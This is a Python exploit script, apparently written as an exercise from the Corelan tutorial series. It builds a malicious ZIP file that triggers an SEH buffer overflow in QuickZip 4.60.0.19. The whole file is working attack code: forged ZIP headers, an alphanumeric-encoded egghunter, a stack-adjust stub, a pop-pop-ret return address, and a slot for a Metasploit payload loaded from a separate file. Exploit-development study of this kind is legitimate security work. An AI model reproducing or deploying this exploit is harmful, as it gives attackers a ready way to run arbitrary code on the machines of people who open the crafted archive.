#!/usr/bin/python

'''
QuickZip buffer overflow exploit from Corelan blog series 
exploiting using ppr 
Program Name: QuickZip 4.60.0.19
Offset :- 
Shellcode := 
Special Thanks to Corelan and OffsecTeam 
'''

def createZip(fileName,shellcode):
    fileHandler = open(fileName,'w')
    ldfHeader =  "\x50\x4B\x03\x04\x14\x00\x00"
    ldfHeader += "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    ldfHeader += "\x00\x00\x00\x00\x00\x00\x00\x00"
    ldfHeader += "\xe4\x0f"  #file size
    ldfHeader += "\x00\x00\x00"

    cdfHeader =  "\x50\x4B\x01\x02\x14\x00\x14"
    cdfHeader += "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    cdfHeader += "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    cdfHeader += "\xe4\x0f"
    cdfHeader += "\x00\x00\x00\x00\x00\x00\x01\x00"
    cdfHeader += "\x24\x00\x00\x00\x00\x00\x00\x00"

    eofcdfHeader = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
    eofcdfHeader += "\x12\x10\x00\x00" # Size of central directory (bytes)
    eofcdfHeader += "\x02\x10\x00\x00" # Offset of start of central directory, relative to start of archive
    eofcdfHeader += "\x00\x00"

    payload = shellcode #metasploit payload
    payload += ".txt"

    print "[+] Size of the payload is {0}".format(len(payload))
    print "[+] Creating file with Name {0}".format(fileName)

    fileHandler.write(ldfHeader+payload+cdfHeader+payload+eofcdfHeader)
    fileHandler.close()

    print "[+] File Creating Finish ! Happy Exploiting !"


def readShellcode():
    fileHandler = open("buffer.txt","r")
    payload = fileHandler.read()
    fileHandler.close()
    # add ebx, 0x43a, jmp ebx
    subShellcode = "\x2D\x25\x25\x25\x5F\x2D\x61\x61\x61\x62\x2D\x7A\x79\x7A\x5A\x50\x25\x55\x4E\x4D\x4A\x25\x2A\x31\x32\x35\x2d\x25\x5f\x25\x25\x2d\x25\x63\x25\x5f\x2d\x35\x7a\x7a\x77\x50"
    # egghunter.rb -p windows -a x86 -e w00t | x86/alpha_mixed BaseRegister=ebx
    egghunter = "SYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIrFk19ZYoTO3r1BBJER3hjmDnWLgucjqdZOh8CG00tp1dNiN7NORUxjlod5IwkOHgAA"
    # 004C786F -- ppr from QuickZip code section 
    shellcode = egghunter + "A"*(298-len(egghunter)-len(subShellcode)-23) + "\x59\x59\x59\x59\x59\x51\x5c" + subShellcode + "A"*16 +  "\x73\xf1\x74\xf1" + "\x6f\x78\x4c\x00"  
    shellcode += payload + "A"*(4064-len(shellcode)-len(payload)) 
    print "[+] Length of Shellcode {0}".format(len(shellcode))
    return shellcode

    
if __name__ == '__main__':
    fileName="quickzipexploit.zip"
    shellcode=readShellcode()
    createZip(fileName,shellcode)




